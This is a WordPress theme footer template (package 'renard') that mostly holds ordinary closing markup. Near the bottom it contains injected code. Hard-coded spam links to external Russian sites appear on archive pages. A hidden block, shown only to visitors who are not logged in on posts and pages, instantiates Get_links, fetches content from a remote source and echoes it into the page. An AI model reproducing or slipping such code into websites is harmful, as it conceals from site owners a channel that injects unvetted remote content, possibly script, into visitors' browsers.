<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package renard
 */

?>
		</div>
	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<?php renard_footer_sidebars(); ?>
		<div class="site-info">
			<div class="container">
		
				<div class="footer-logo">
					<a class="footer-logo-link" href="<?php echo home_url( '/' ); ?>"><?php bloginfo( 'name' ); ?></a>
				</div>
				<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> / <a href="http://www.tefox.net/" rel="nofollow">Tefox</a> / <a href="http://builderbody.ru/" title="Бодибилдинг и фитнес - упражнения, тренировки, спортивное питание" target="_blank">Fitness</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>

			</div>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
